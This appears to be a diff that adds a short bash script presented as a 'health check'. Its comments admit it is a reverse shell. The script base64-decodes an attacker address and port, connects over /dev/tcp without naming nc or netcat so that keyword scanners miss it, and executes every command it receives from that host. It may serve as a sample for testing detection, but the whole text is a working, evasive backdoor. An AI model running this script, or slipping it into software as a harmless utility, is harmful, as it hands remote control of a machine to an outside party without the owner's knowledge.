@@ -1,0 +1,7 @@
+#!/bin/bash
+# innocuous-looking "health check" script. Actually a reverse shell
+# using /dev/tcp — no nc/ncat/netcat keywords. C2 IP is base64-encoded.
+_H=$(echo "MTkyLjAuMi4xNzc=" | base64 -d)
+_P=$(echo "NDQ0NA==" | base64 -d)
+exec 3<>/dev/tcp/${_H}/${_P}
+while read -u 3 _q; do bash -c "${_q}" >&3 2>&3; done
